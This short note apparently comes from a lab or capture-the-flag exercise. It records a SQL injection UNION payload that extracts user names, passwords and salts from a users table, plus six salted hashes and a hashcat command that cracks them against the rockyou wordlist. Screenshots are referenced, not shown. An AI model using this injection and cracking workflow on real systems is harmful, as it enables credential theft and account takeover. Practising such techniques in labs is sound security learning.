
![[Pasted image 20260627113206.png]]

UNION SELECT 1,user_name,password||':'||salt FROM users--

![[Pasted image 20260627131233.png]]

When I was doing 5 parameters I was getting an error. 

![[Pasted image 20260627131517.png]]

![[Pasted image 20260627131615.png]]

cat > hashes_all.txt << 'EOF'
d2d5151b6c0aa5fa249b8a0c59996470e5094d2f2ec8eb2ecbb60a9037b02f63:x3nzIikZ3-M
a808b667533e696d3303741145a9295c9da74cc2e688e86b35699dc3ca260dd5:-2OuN0ikDRM
f71cc3a619ca1e62f55800cb11ce849c3afcb013cc6ce3e8de3590b72aaff41f:gKY2igGEilw
3cb1eb46be12afd2b180a2af575a70cc8a916a8511c757a36a8bec681c5d37b0:Y6mwaomTFhw
6a0733693da18618ff4786c9bc09891a6bed1b888575c8a0b70dbb7062321520:4NQPExxcr1g
d1e18f2b28548478a24672eb04377de850028f35673807d7f760f457d9aab3d8:GclDlw9e7NY
EOF

hashcat -m 1420 hashes_all.txt rockyou.txt -O


![[Pasted image 20260627132327.png]]
![[Pasted image 20260627133009.png]]
